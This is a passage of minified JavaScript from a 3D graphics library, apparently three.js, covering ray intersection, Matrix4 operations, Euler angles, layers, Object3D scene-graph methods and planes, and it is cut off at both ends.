0===t||e.normal.dot(this.direction)*t<0},t.intersectBox=function(e,t){var n,r,i,a,o,s,l=1/this.direction.x,c=1/this.direction.y,u=1/this.direction.z,d=this.origin;return r=0<=l?(n=(e.min.x-d.x)*l,(e.max.x-d.x)*l):(n=(e.max.x-d.x)*l,(e.min.x-d.x)*l),(a=0<=c?(i=(e.min.y-d.y)*c,(e.max.y-d.y)*c):(i=(e.max.y-d.y)*c,(e.min.y-d.y)*c))<n||r<i?null:((n<i||n!=n)&&(n=i),(a<r||r!=r)&&(r=a),(s=0<=u?(o=(e.min.z-d.z)*u,(e.max.z-d.z)*u):(o=(e.max.z-d.z)*u,(e.min.z-d.z)*u))<n||r<o?null:((n<o||n!=n)&&(n=o),(s<r||r!=r)&&(r=s),r<0?null:this.at(0<=n?n:r,t)))},t.intersectsBox=function(e){return null!==this.intersectBox(e,Fe)},t.intersectTriangle=function(e,t,n,r,i){De.subVectors(t,e),Re.subVectors(n,e),je.crossVectors(De,Re);var a,o=this.direction.dot(je);if(0<o){if(r)return null;a=1}else{if(!(o<0))return null;a=-1,o=-o}Ne.subVectors(this.origin,e);var s=a*this.direction.dot(Re.crossVectors(Ne,Re));if(s<0)return null;var l=a*this.direction.dot(De.cross(Ne));if(l<0)return null;if(o<s+l)return null;var c=-a*Ne.dot(je);return c<0?null:this.at(c/o,i)},t.applyMatrix4=function(e){return this.origin.applyMatrix4(e),this.direction.transformDirection(e),this},t.equals=function(e){return e.origin.equals(this.origin)&&e.direction.equals(this.direction)},e}(),$e=function(){function e(){Object.defineProperty(this,"isMatrix4",{value:!0}),this.elements=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1]}var t=e.prototype;return t.set=function(e,t,n,r,i,a,o,s,l,c,u,d,p,h,f,A){var m=this.elements;return m[0]=e,m[4]=t,m[8]=n,m[12]=r,m[1]=i,m[5]=a,m[9]=o,m[13]=s,m[2]=l,m[6]=c,m[10]=u,m[14]=d,m[3]=p,m[7]=h,m[11]=f,m[15]=A,this},t.identity=function(){return this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1),this},t.clone=function(){return(new e).fromArray(this.elements)},t.copy=function(e){var t=this.elements,n=e.elements;return t[0]=n[0],t[1]=n[1],t[2]=n[2],t[3]=n[3],t[4]=n[4],t[5]=n[5],t[6]=n[6],t[7]=n[7],t[8]=n[8],t[9]=n[9],t[10]=n[10],t[11]=n[11],t[12]=n[12],t[13]=n[13],t[14]=n[14],t[15]=n[15],this},t.copyPosition=function(e){var t=this.elements,n=e.elements;return t[12]=n[12],t[13]=n[13],t[14]=n[14],this},t.extractBasis=function(e,t,n){return e.setFromMatrixColumn(this,0),t.setFromMatrixColumn(this,1),n.setFromMatrixColumn(this,2),this},t.makeBasis=function(e,t,n){return this.set(e.x,t.x,n.x,0,e.y,t.y,n.y,0,e.z,t.z,n.z,0,0,0,0,1),this},t.extractRotation=function(e){var t=this.elements,n=e.elements,r=1/ze.setFromMatrixColumn(e,0).length(),i=1/ze.setFromMatrixColumn(e,1).length(),a=1/ze.setFromMatrixColumn(e,2).length();return t[0]=n[0]*r,t[1]=n[1]*r,t[2]=n[2]*r,t[3]=0,t[4]=n[4]*i,t[5]=n[5]*i,t[6]=n[6]*i,t[7]=0,t[8]=n[8]*a,t[9]=n[9]*a,t[10]=n[10]*a,t[11]=0,t[12]=0,t[13]=0,t[14]=0,t[15]=1,this},t.makeRotationFromEuler=function(e){!e||e.isEuler;var t=this.elements,n=e.x,r=e.y,i=e.z,a=Math.cos(n),o=Math.sin(n),s=Math.cos(r),l=Math.sin(r),c=Math.cos(i),u=Math.sin(i);if("XYZ"===e.order){var d=a*c,p=a*u,h=o*c,f=o*u;t[0]=s*c,t[4]=-s*u,t[8]=l,t[1]=p+h*l,t[5]=d-f*l,t[9]=-o*s,t[2]=f-d*l,t[6]=h+p*l,t[10]=a*s}else if("YXZ"===e.order){var A=s*c,m=s*u,v=l*c,g=l*u;t[0]=A+g*o,t[4]=v*o-m,t[8]=a*l,t[1]=a*u,t[5]=a*c,t[9]=-o,t[2]=m*o-v,t[6]=g+A*o,t[10]=a*s}else if("ZXY"===e.order){var y=s*c,b=s*u,_=l*c,w=l*u;t[0]=y-w*o,t[4]=-a*u,t[8]=_+b*o,t[1]=b+_*o,t[5]=a*c,t[9]=w-y*o,t[2]=-a*l,t[6]=o,t[10]=a*s}else if("ZYX"===e.order){var C=a*c,x=a*u,S=o*c,k=o*u;t[0]=s*c,t[4]=S*l-x,t[8]=C*l+k,t[1]=s*u,t[5]=k*l+C,t[9]=x*l-S,t[2]=-l,t[6]=o*s,t[10]=a*s}else if("YZX"===e.order){var M=a*s,B=a*l,E=o*s,T=o*l;t[0]=s*c,t[4]=T-M*u,t[8]=E*u+B,t[1]=u,t[5]=a*c,t[9]=-o*c,t[2]=-l*c,t[6]=B*u+E,t[10]=M-T*u}else if("XZY"===e.order){var P=a*s,I=a*l,F=o*s,L=o*l;t[0]=s*c,t[4]=-u,t[8]=l*c,t[1]=P*u+L,t[5]=a*c,t[9]=I*u-F,t[2]=F*u-I,t[6]=o*c,t[10]=L*u+P}return t[3]=0,t[7]=0,t[11]=0,t[12]=0,t[13]=0,t[14]=0,t[15]=1,this},t.makeRotationFromQuaternion=function(e){return this.compose(Ve,e,Qe)},t.lookAt=function(e,t,n){var r=this.elements;return Ke.subVectors(e,t),0===Ke.lengthSq()&&(Ke.z=1),Ke.normalize(),Ge.crossVectors(n,Ke),0===Ge.lengthSq()&&(1===Math.abs(n.z)?Ke.x+=1e-4:Ke.z+=1e-4,Ke.normalize(),Ge.crossVectors(n,Ke)),Ge.normalize(),We.crossVectors(Ke,Ge),r[0]=Ge.x,r[4]=We.x,r[8]=Ke.x,r[1]=Ge.y,r[5]=We.y,r[9]=Ke.y,r[2]=Ge.z,r[6]=We.z,r[10]=Ke.z,this},t.multiply=function(e,t){return void 0!==t?this.multiplyMatrices(e,t):this.multiplyMatrices(this,e)},t.premultiply=function(e){return this.multiplyMatrices(e,this)},t.multiplyMatrices=function(e,t){var n=e.elements,r=t.elements,i=this.elements,a=n[0],o=n[4],s=n[8],l=n[12],c=n[1],u=n[5],d=n[9],p=n[13],h=n[2],f=n[6],A=n[10],m=n[14],v=n[3],g=n[7],y=n[11],b=n[15],_=r[0],w=r[4],C=r[8],x=r[12],S=r[1],k=r[5],M=r[9],B=r[13],E=r[2],T=r[6],P=r[10],I=r[14],F=r[3],L=r[7],O=r[11],N=r[15];return i[0]=a*_+o*S+s*E+l*F,i[4]=a*w+o*k+s*T+l*L,i[8]=a*C+o*M+s*P+l*O,i[12]=a*x+o*B+s*I+l*N,i[1]=c*_+u*S+d*E+p*F,i[5]=c*w+u*k+d*T+p*L,i[9]=c*C+u*M+d*P+p*O,i[13]=c*x+u*B+d*I+p*N,i[2]=h*_+f*S+A*E+m*F,i[6]=h*w+f*k+A*T+m*L,i[10]=h*C+f*M+A*P+m*O,i[14]=h*x+f*B+A*I+m*N,i[3]=v*_+g*S+y*E+b*F,i[7]=v*w+g*k+y*T+b*L,i[11]=v*C+g*M+y*P+b*O,i[15]=v*x+g*B+y*I+b*N,this},t.multiplyScalar=function(e){var t=this.elements;return t[0]*=e,t[4]*=e,t[8]*=e,t[12]*=e,t[1]*=e,t[5]*=e,t[9]*=e,t[13]*=e,t[2]*=e,t[6]*=e,t[10]*=e,t[14]*=e,t[3]*=e,t[7]*=e,t[11]*=e,t[15]*=e,this},t.determinant=function(){var e=this.elements,t=e[0],n=e[4],r=e[8],i=e[12],a=e[1],o=e[5],s=e[9],l=e[13],c=e[2],u=e[6],d=e[10],p=e[14];return e[3]*(+i*s*u-r*l*u-i*o*d+n*l*d+r*o*p-n*s*p)+e[7]*(+t*s*p-t*l*d+i*a*d-r*a*p+r*l*c-i*s*c)+e[11]*(+t*l*u-t*o*p-i*a*u+n*a*p+i*o*c-n*l*c)+e[15]*(-r*o*c-t*s*u+t*o*d+r*a*u-n*a*d+n*s*c)},t.transpose=function(){var e,t=this.elements;return e=t[1],t[1]=t[4],t[4]=e,e=t[2],t[2]=t[8],t[8]=e,e=t[6],t[6]=t[9],t[9]=e,e=t[3],t[3]=t[12],t[12]=e,e=t[7],t[7]=t[13],t[13]=e,e=t[11],t[11]=t[14],t[14]=e,this},t.setPosition=function(e,t,n){var r=this.elements;return e.isVector3?(r[12]=e.x,r[13]=e.y,r[14]=e.z):(r[12]=e,r[13]=t,r[14]=n),this},t.getInverse=function(e,t){var n=this.elements,r=e.elements,i=r[0],a=r[1],o=r[2],s=r[3],l=r[4],c=r[5],u=r[6],d=r[7],p=r[8],h=r[9],f=r[10],A=r[11],m=r[12],v=r[13],g=r[14],y=r[15],b=h*g*d-v*f*d+v*u*A-c*g*A-h*u*y+c*f*y,_=m*f*d-p*g*d-m*u*A+l*g*A+p*u*y-l*f*y,w=p*v*d-m*h*d+m*c*A-l*v*A-p*c*y+l*h*y,C=m*h*u-p*v*u-m*c*f+l*v*f+p*c*g-l*h*g,x=i*b+a*_+o*w+s*C;if(0===x)return this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);var S=1/x;return n[0]=b*S,n[1]=(v*f*s-h*g*s-v*o*A+a*g*A+h*o*y-a*f*y)*S,n[2]=(c*g*s-v*u*s+v*o*d-a*g*d-c*o*y+a*u*y)*S,n[3]=(h*u*s-c*f*s-h*o*d+a*f*d+c*o*A-a*u*A)*S,n[4]=_*S,n[5]=(p*g*s-m*f*s+m*o*A-i*g*A-p*o*y+i*f*y)*S,n[6]=(m*u*s-l*g*s-m*o*d+i*g*d+l*o*y-i*u*y)*S,n[7]=(l*f*s-p*u*s+p*o*d-i*f*d-l*o*A+i*u*A)*S,n[8]=w*S,n[9]=(m*h*s-p*v*s-m*a*A+i*v*A+p*a*y-i*h*y)*S,n[10]=(l*v*s-m*c*s+m*a*d-i*v*d-l*a*y+i*c*y)*S,n[11]=(p*c*s-l*h*s-p*a*d+i*h*d+l*a*A-i*c*A)*S,n[12]=C*S,n[13]=(p*v*o-m*h*o+m*a*f-i*v*f-p*a*g+i*h*g)*S,n[14]=(m*c*o-l*v*o-m*a*u+i*v*u+l*a*g-i*c*g)*S,n[15]=(l*h*o-p*c*o+p*a*u-i*h*u-l*a*f+i*c*f)*S,this},t.scale=function(e){var t=this.elements,n=e.x,r=e.y,i=e.z;return t[0]*=n,t[4]*=r,t[8]*=i,t[1]*=n,t[5]*=r,t[9]*=i,t[2]*=n,t[6]*=r,t[10]*=i,t[3]*=n,t[7]*=r,t[11]*=i,this},t.getMaxScaleOnAxis=function(){var e=this.elements,t=e[0]*e[0]+e[1]*e[1]+e[2]*e[2],n=e[4]*e[4]+e[5]*e[5]+e[6]*e[6],r=e[8]*e[8]+e[9]*e[9]+e[10]*e[10];return Math.sqrt(Math.max(t,n,r))},t.makeTranslation=function(e,t,n){return this.set(1,0,0,e,0,1,0,t,0,0,1,n,0,0,0,1),this},t.makeRotationX=function(e){var t=Math.cos(e),n=Math.sin(e);return this.set(1,0,0,0,0,t,-n,0,0,n,t,0,0,0,0,1),this},t.makeRotationY=function(e){var t=Math.cos(e),n=Math.sin(e);return this.set(t,0,n,0,0,1,0,0,-n,0,t,0,0,0,0,1),this},t.makeRotationZ=function(e){var t=Math.cos(e),n=Math.sin(e);return this.set(t,-n,0,0,n,t,0,0,0,0,1,0,0,0,0,1),this},t.makeRotationAxis=function(e,t){var n=Math.cos(t),r=Math.sin(t),i=1-n,a=e.x,o=e.y,s=e.z,l=i*a,c=i*o;return this.set(l*a+n,l*o-r*s,l*s+r*o,0,l*o+r*s,c*o+n,c*s-r*a,0,l*s-r*o,c*s+r*a,i*s*s+n,0,0,0,0,1),this},t.makeScale=function(e,t,n){return this.set(e,0,0,0,0,t,0,0,0,0,n,0,0,0,0,1),this},t.makeShear=function(e,t,n){return this.set(1,t,n,0,e,1,n,0,e,t,1,0,0,0,0,1),this},t.compose=function(e,t,n){var r=this.elements,i=t._x,a=t._y,o=t._z,s=t._w,l=i+i,c=a+a,u=o+o,d=i*l,p=i*c,h=i*u,f=a*c,A=a*u,m=o*u,v=s*l,g=s*c,y=s*u,b=n.x,_=n.y,w=n.z;return r[0]=(1-(f+m))*b,r[1]=(p+y)*b,r[2]=(h-g)*b,r[3]=0,r[4]=(p-y)*_,r[5]=(1-(d+m))*_,r[6]=(A+v)*_,r[7]=0,r[8]=(h+g)*w,r[9]=(A-v)*w,r[10]=(1-(d+f))*w,r[11]=0,r[12]=e.x,r[13]=e.y,r[14]=e.z,r[15]=1,this},t.decompose=function(e,t,n){var r=this.elements,i=ze.set(r[0],r[1],r[2]).length(),a=ze.set(r[4],r[5],r[6]).length(),o=ze.set(r[8],r[9],r[10]).length();this.determinant()<0&&(i=-i),e.x=r[12],e.y=r[13],e.z=r[14],He.copy(this);var s=1/i,l=1/a,c=1/o;return He.elements[0]*=s,He.elements[1]*=s,He.elements[2]*=s,He.elements[4]*=l,He.elements[5]*=l,He.elements[6]*=l,He.elements[8]*=c,He.elements[9]*=c,He.elements[10]*=c,t.setFromRotationMatrix(He),n.x=i,n.y=a,n.z=o,this},t.makePerspective=function(e,t,n,r,i,a){var o=this.elements,s=2*i/(t-e),l=2*i/(n-r),c=(t+e)/(t-e),u=(n+r)/(n-r),d=-(a+i)/(a-i),p=-2*a*i/(a-i);return o[0]=s,o[4]=0,o[8]=c,o[12]=0,o[1]=0,o[5]=l,o[9]=u,o[13]=0,o[2]=0,o[6]=0,o[10]=d,o[14]=p,o[3]=0,o[7]=0,o[11]=-1,o[15]=0,this},t.makeOrthographic=function(e,t,n,r,i,a){var o=this.elements,s=1/(t-e),l=1/(n-r),c=1/(a-i),u=(t+e)*s,d=(n+r)*l,p=(a+i)*c;return o[0]=2*s,o[4]=0,o[8]=0,o[12]=-u,o[1]=0,o[5]=2*l,o[9]=0,o[13]=-d,o[2]=0,o[6]=0,o[10]=-2*c,o[14]=-p,o[3]=0,o[7]=0,o[11]=0,o[15]=1,this},t.equals=function(e){for(var t=this.elements,n=e.elements,r=0;r<16;r++)if(t[r]!==n[r])return!1;return!0},t.fromArray=function(e,t){void 0===t&&(t=0);for(var n=0;n<16;n++)this.elements[n]=e[n+t];return this},t.toArray=function(e,t){void 0===e&&(e=[]),void 0===t&&(t=0);var n=this.elements;return e[t]=n[0],e[t+1]=n[1],e[t+2]=n[2],e[t+3]=n[3],e[t+4]=n[4],e[t+5]=n[5],e[t+6]=n[6],e[t+7]=n[7],e[t+8]=n[8],e[t+9]=n[9],e[t+10]=n[10],e[t+11]=n[11],e[t+12]=n[12],e[t+13]=n[13],e[t+14]=n[14],e[t+15]=n[15],e},e}(),ze=new he,He=new $e,Ve=new he(0,0,0),Qe=new he(1,1,1),Ge=new he,We=new he,Ke=new he,qe=function(){function e(t,n,r,i){void 0===t&&(t=0),void 0===n&&(n=0),void 0===r&&(r=0),void 0===i&&(i=e.DefaultOrder),Object.defineProperty(this,"isEuler",{value:!0}),this._x=t,this._y=n,this._z=r,this._order=i}var t=e.prototype;return t.set=function(e,t,n,r){return this._x=e,this._y=t,this._z=n,this._order=r||this._order,this._onChangeCallback(),this},t.clone=function(){return new this.constructor(this._x,this._y,this._z,this._order)},t.copy=function(e){return this._x=e._x,this._y=e._y,this._z=e._z,this._order=e._order,this._onChangeCallback(),this},t.setFromRotationMatrix=function(e,t,n){var r=J.clamp,i=e.elements,a=i[0],o=i[4],s=i[8],l=i[1],c=i[5],u=i[9],d=i[2],p=i[6],h=i[10];switch(t=t||this._order){case"XYZ":this._y=Math.asin(r(s,-1,1)),Math.abs(s)<.9999999?(this._x=Math.atan2(-u,h),this._z=Math.atan2(-o,a)):(this._x=Math.atan2(p,c),this._z=0);break;case"YXZ":this._x=Math.asin(-r(u,-1,1)),Math.abs(u)<.9999999?(this._y=Math.atan2(s,h),this._z=Math.atan2(l,c)):(this._y=Math.atan2(-d,a),this._z=0);break;case"ZXY":this._x=Math.asin(r(p,-1,1)),Math.abs(p)<.9999999?(this._y=Math.atan2(-d,h),this._z=Math.atan2(-o,c)):(this._y=0,this._z=Math.atan2(l,a));break;case"ZYX":this._y=Math.asin(-r(d,-1,1)),Math.abs(d)<.9999999?(this._x=Math.atan2(p,h),this._z=Math.atan2(l,a)):(this._x=0,this._z=Math.atan2(-o,c));break;case"YZX":this._z=Math.asin(r(l,-1,1)),Math.abs(l)<.9999999?(this._x=Math.atan2(-u,c),this._y=Math.atan2(-d,a)):(this._x=0,this._y=Math.atan2(s,h));break;case"XZY":this._z=Math.asin(-r(o,-1,1)),Math.abs(o)<.9999999?(this._x=Math.atan2(p,c),this._y=Math.atan2(s,a)):(this._x=Math.atan2(-u,h),this._y=0)}return this._order=t,!1!==n&&this._onChangeCallback(),this},t.setFromQuaternion=function(e,t,n){return Xe.makeRotationFromQuaternion(e),this.setFromRotationMatrix(Xe,t,n)},t.setFromVector3=function(e,t){return this.set(e.x,e.y,e.z,t||this._order)},t.reorder=function(e){return Ye.setFromEuler(this),this.setFromQuaternion(Ye,e)},t.equals=function(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._order===this._order},t.fromArray=function(e){return this._x=e[0],this._y=e[1],this._z=e[2],void 0!==e[3]&&(this._order=e[3]),this._onChangeCallback(),this},t.toArray=function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this._x,e[t+1]=this._y,e[t+2]=this._z,e[t+3]=this._order,e},t.toVector3=function(e){return e?e.set(this._x,this._y,this._z):new he(this._x,this._y,this._z)},t._onChange=function(e){return this._onChangeCallback=e,this},t._onChangeCallback=function(){},ee(e,[{key:"x",get:function(){return this._x},set:function(e){this._x=e,this._onChangeCallback()}},{key:"y",get:function(){return this._y},set:function(e){this._y=e,this._onChangeCallback()}},{key:"z",get:function(){return this._z},set:function(e){this._z=e,this._onChangeCallback()}},{key:"order",get:function(){return this._order},set:function(e){this._order=e,this._onChangeCallback()}}]),e}();qe.DefaultOrder="XYZ",qe.RotationOrders=["XYZ","YZX","ZXY","XZY","YXZ","ZYX"];var Xe=new $e,Ye=new pe,Je=function(){function e(){this.mask=1}var t=e.prototype;return t.set=function(e){this.mask=1<<e|0},t.enable=function(e){this.mask|=1<<e|0},t.enableAll=function(){this.mask=-1},t.toggle=function(e){this.mask^=1<<e|0},t.disable=function(e){this.mask&=~(1<<e|0)},t.disableAll=function(){this.mask=0},t.test=function(e){return 0!=(this.mask&e.mask)},e}(),Ze=0,et=new he,tt=new pe,nt=new $e,rt=new he,it=new he,at=new he,ot=new pe,st=new he(1,0,0),lt=new he(0,1,0),ct=new he(0,0,1),ut={type:"added"},dt={type:"removed"};function pt(){Object.defineProperty(this,"id",{value:Ze++}),this.uuid=J.generateUUID(),this.name="",this.type="Object3D",this.parent=null,this.children=[],this.up=pt.DefaultUp.clone();var e=new he,t=new qe,n=new pe,r=new he(1,1,1);t._onChange((function(){n.setFromEuler(t,!1)})),n._onChange((function(){t.setFromQuaternion(n,void 0,!1)})),Object.defineProperties(this,{position:{configurable:!0,enumerable:!0,value:e},rotation:{configurable:!0,enumerable:!0,value:t},quaternion:{configurable:!0,enumerable:!0,value:n},scale:{configurable:!0,enumerable:!0,value:r},modelViewMatrix:{value:new $e},normalMatrix:{value:new ae}}),this.matrix=new $e,this.matrixWorld=new $e,this.matrixAutoUpdate=pt.DefaultMatrixAutoUpdate,this.matrixWorldNeedsUpdate=!1,this.layers=new Je,this.visible=!0,this.castShadow=!1,this.receiveShadow=!1,this.frustumCulled=!0,this.renderOrder=0,this.userData={}}pt.DefaultUp=new he(0,1,0),pt.DefaultMatrixAutoUpdate=!0,pt.prototype=Object.assign(Object.create(K.prototype),{constructor:pt,isObject3D:!0,onBeforeRender:function(){},onAfterRender:function(){},applyMatrix4:function(e){this.matrixAutoUpdate&&this.updateMatrix(),this.matrix.premultiply(e),this.matrix.decompose(this.position,this.quaternion,this.scale)},applyQuaternion:function(e){return this.quaternion.premultiply(e),this},setRotationFromAxisAngle:function(e,t){this.quaternion.setFromAxisAngle(e,t)},setRotationFromEuler:function(e){this.quaternion.setFromEuler(e,!0)},setRotationFromMatrix:function(e){this.quaternion.setFromRotationMatrix(e)},setRotationFromQuaternion:function(e){this.quaternion.copy(e)},rotateOnAxis:function(e,t){return tt.setFromAxisAngle(e,t),this.quaternion.multiply(tt),this},rotateOnWorldAxis:function(e,t){return tt.setFromAxisAngle(e,t),this.quaternion.premultiply(tt),this},rotateX:function(e){return this.rotateOnAxis(st,e)},rotateY:function(e){return this.rotateOnAxis(lt,e)},rotateZ:function(e){return this.rotateOnAxis(ct,e)},translateOnAxis:function(e,t){return et.copy(e).applyQuaternion(this.quaternion),this.position.add(et.multiplyScalar(t)),this},translateX:function(e){return this.translateOnAxis(st,e)},translateY:function(e){return this.translateOnAxis(lt,e)},translateZ:function(e){return this.translateOnAxis(ct,e)},localToWorld:function(e){return e.applyMatrix4(this.matrixWorld)},worldToLocal:function(e){return e.applyMatrix4(nt.getInverse(this.matrixWorld))},lookAt:function(e,t,n){e.isVector3?rt.copy(e):rt.set(e,t,n);var r=this.parent;this.updateWorldMatrix(!0,!1),it.setFromMatrixPosition(this.matrixWorld),this.isCamera||this.isLight?nt.lookAt(it,rt,this.up):nt.lookAt(rt,it,this.up),this.quaternion.setFromRotationMatrix(nt),r&&(nt.extractRotation(r.matrixWorld),tt.setFromRotationMatrix(nt),this.quaternion.premultiply(tt.inverse()))},add:function(e){if(1<arguments.length){for(var t=0;t<arguments.length;t++)this.add(arguments[t]);return this}return e===this||e&&e.isObject3D&&(null!==e.parent&&e.parent.remove(e),(e.parent=this).children.push(e),e.dispatchEvent(ut)),this},remove:function(e){if(1<arguments.length){for(var t=0;t<arguments.length;t++)this.remove(arguments[t]);return this}var n=this.children.indexOf(e);return-1!==n&&(e.parent=null,this.children.splice(n,1),e.dispatchEvent(dt)),this},clear:function(){for(var e=0;e<this.children.length;e++){var t=this.children[e];t.parent=null,t.dispatchEvent(dt)}return this.children.length=0,this},attach:function(e){return this.updateWorldMatrix(!0,!1),nt.getInverse(this.matrixWorld),null!==e.parent&&(e.parent.updateWorldMatrix(!0,!1),nt.multiply(e.parent.matrixWorld)),e.applyMatrix4(nt),e.updateWorldMatrix(!1,!1),this.add(e),this},getObjectById:function(e){return this.getObjectByProperty("id",e)},getObjectByName:function(e){return this.getObjectByProperty("name",e)},getObjectByProperty:function(e,t){if(this[e]===t)return this;for(var n=0,r=this.children.length;n<r;n++){var i=this.children[n].getObjectByProperty(e,t);if(void 0!==i)return i}},getWorldPosition:function(e){return void 0===e&&(e=new he),this.updateWorldMatrix(!0,!1),e.setFromMatrixPosition(this.matrixWorld)},getWorldQuaternion:function(e){return void 0===e&&(e=new pe),this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(it,e,at),e},getWorldScale:function(e){return void 0===e&&(e=new he),this.updateWorldMatrix(!0,!1),this.matrixWorld.decompose(it,ot,e),e},getWorldDirection:function(e){void 0===e&&(e=new he),this.updateWorldMatrix(!0,!1);var t=this.matrixWorld.elements;return e.set(t[8],t[9],t[10]).normalize()},raycast:function(){},traverse:function(e){e(this);for(var t=this.children,n=0,r=t.length;n<r;n++)t[n].traverse(e)},traverseVisible:function(e){if(!1!==this.visible){e(this);for(var t=this.children,n=0,r=t.length;n<r;n++)t[n].traverseVisible(e)}},traverseAncestors:function(e){var t=this.parent;null!==t&&(e(t),t.traverseAncestors(e))},updateMatrix:function(){this.matrix.compose(this.position,this.quaternion,this.scale),this.matrixWorldNeedsUpdate=!0},updateMatrixWorld:function(e){this.matrixAutoUpdate&&this.updateMatrix(),(this.matrixWorldNeedsUpdate||e)&&(null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),e=!(this.matrixWorldNeedsUpdate=!1));for(var t=this.children,n=0,r=t.length;n<r;n++)t[n].updateMatrixWorld(e)},updateWorldMatrix:function(e,t){var n=this.parent;if(!0===e&&null!==n&&n.updateWorldMatrix(!0,!1),this.matrixAutoUpdate&&this.updateMatrix(),null===this.parent?this.matrixWorld.copy(this.matrix):this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix),!0===t)for(var r=this.children,i=0,a=r.length;i<a;i++)r[i].updateWorldMatrix(!1,!0)},toJSON:function(e){var t=void 0===e||"string"==typeof e,n={};t&&(e={geometries:{},materials:{},textures:{},images:{},shapes:{}},n.metadata={version:4.5,type:"Object",generator:"Object3D.toJSON"});var r={};function i(t,n){return void 0===t[n.uuid]&&(t[n.uuid]=n.toJSON(e)),n.uuid}if(r.uuid=this.uuid,r.type=this.type,""!==this.name&&(r.name=this.name),!0===this.castShadow&&(r.castShadow=!0),!0===this.receiveShadow&&(r.receiveShadow=!0),!1===this.visible&&(r.visible=!1),!1===this.frustumCulled&&(r.frustumCulled=!1),0!==this.renderOrder&&(r.renderOrder=this.renderOrder),"{}"!==JSON.stringify(this.userData)&&(r.userData=this.userData),r.layers=this.layers.mask,r.matrix=this.matrix.toArray(),!1===this.matrixAutoUpdate&&(r.matrixAutoUpdate=!1),this.isInstancedMesh&&(r.type="InstancedMesh",r.count=this.count,r.instanceMatrix=this.instanceMatrix.toJSON()),this.isMesh||this.isLine||this.isPoints){r.geometry=i(e.geometries,this.geometry);var a=this.geometry.parameters;if(void 0!==a&&void 0!==a.shapes){var o=a.shapes;if(Array.isArray(o))for(var s=0,l=o.length;s<l;s++){var c=o[s];i(e.shapes,c)}else i(e.shapes,o)}}if(void 0!==this.material)if(Array.isArray(this.material)){for(var u=[],d=0,p=this.material.length;d<p;d++)u.push(i(e.materials,this.material[d]));r.material=u}else r.material=i(e.materials,this.material);if(0<this.children.length){r.children=[];for(var h=0;h<this.children.length;h++)r.children.push(this.children[h].toJSON(e).object)}if(t){var f=y(e.geometries),A=y(e.materials),m=y(e.textures),v=y(e.images),g=y(e.shapes);0<f.length&&(n.geometries=f),0<A.length&&(n.materials=A),0<m.length&&(n.textures=m),0<v.length&&(n.images=v),0<g.length&&(n.shapes=g)}return n.object=r,n;function y(e){var t=[];for(var n in e){var r=e[n];delete r.metadata,t.push(r)}return t}},clone:function(e){return(new this.constructor).copy(this,e)},copy:function(e,t){if(void 0===t&&(t=!0),this.name=e.name,this.up.copy(e.up),this.position.copy(e.position),this.rotation.order=e.rotation.order,this.quaternion.copy(e.quaternion),this.scale.copy(e.scale),this.matrix.copy(e.matrix),this.matrixWorld.copy(e.matrixWorld),this.matrixAutoUpdate=e.matrixAutoUpdate,this.matrixWorldNeedsUpdate=e.matrixWorldNeedsUpdate,this.layers.mask=e.layers.mask,this.visible=e.visible,this.castShadow=e.castShadow,this.receiveShadow=e.receiveShadow,this.frustumCulled=e.frustumCulled,this.renderOrder=e.renderOrder,this.userData=JSON.parse(JSON.stringify(e.userData)),!0===t)for(var n=0;n<e.children.length;n++){var r=e.children[n];this.add(r.clone())}return this}});var ht=new he,ft=new he,At=new ae,mt=function(){function e(e,t){Object.defineProperty(this,"isPlane",{value:!0}),this.normal=void 0!==e?e:new he(1,0,0),this.constant=void 0!==t?t:0}var t=e.prototype;return t.set=function(e,t){return this.normal.copy(e),this.constant=t,this},t.setComponents=function(e,t,n,r){return this.normal.set(e,t,n),this.constant=r,this},t.setFromNormalAndCoplanarPoint=function(e,t){return this.normal.copy(e),this.constant=-t.dot(this.normal),this},t.setFromCoplanarPoints=function(e,t,n){var r=ht.subVectors(n,t).cross(ft.subVectors(e,t)).normalize();return this.setFromNormalAndCoplanarPoint(r,e),this},t.clone=function(){return(new this.constructor).copy(this)},t.copy=function(e){return this.normal.copy(e.normal),this.constant=e.constant,this},t.normalize=function(){var e=1/this.normal.length();return this.normal.multiplyScalar(e),this.constant*=e,this},t.negate=function(){return this.constant*=-1,this.normal.negate(),this},t.distanceToPoint=function(e){return this.normal.dot(e)+this.constant},t.distanceToSphere=function(e){return this.distanceToPoint(e.center)-e.radius},t.projectPoint=function(e,t){return void 0===t&&(t=new he),t.copy(this.normal).multiplyScalar(-this.distanceToPoint(e)).add(e)},t.intersectLine=function(e,t){void 0===t&&(t=new he);var n=e.delta(ht),r=this.normal.dot(n);if(0===r)return 0===this.distanceToPoint(e.start)?t.copy(e.start):void 0;var i=-(e.start.dot(this.normal)+this.constant)/r;return i<0||1<i?void 0:t.copy(n).multiplyScalar(i).add(e.start)},t.intersectsLine=function(e){var t=this.distanceToPoint(e.start),n=this.distanceToPoint(e.end);return t<0&&0<n||n<0&&0<t},t.intersectsBox=function(e){return e.intersectsPlane(this)},t.intersectsSphere=function(e){return e.intersectsPlane(this)},t.coplanarPoint=function(e){return void 0===e&&(e=new he),e.copy(this.normal).multiplyScalar(-this.constant)},t.applyMatrix4=function(e,t){var n=t||At.getNormalMatrix(e),r=this.coplanarPoint(ht).applyMatrix4(e),i=this.normal.applyMatrix3(n).normalize();return this.constant=-r.dot(i),this},t.translate=function(e){return this.constant-=e.dot(this.normal),this},t.equals=function(e){return e.normal.equals(this.normal)&&e.constant===this.constant},e}(),vt=new he,gt=new he,yt=new he,bt=new he,_t=new he,wt=new he,Ct=new he,xt=new he,St=new he,kt=new he,Mt=function(){function e(e,t,n){this.a=void 0!==e?e:new he,this.b=void 0!==t?t:new he,this.c=void 0!==n?n:new he}e.getNormal=function(e,t,n,r){void 0===r&&(r=new he),r.subVectors(n,t),vt.subVectors(e,t),r.cross(vt);var i=r.lengthSq();return 0<i?r.multiplyScalar(1/Math.sqrt(i)):r.set(0,0,0)},e.getBarycoord=function(e,t,n,r,i){vt.subVectors(r,t),gt.subVectors(n,t),yt.subVectors(e,t);var a=vt.dot(vt),o=vt.dot(gt),s=vt.dot(yt),l=gt.dot(gt),c=gt.dot(yt),u=a*l-o*o;if(void 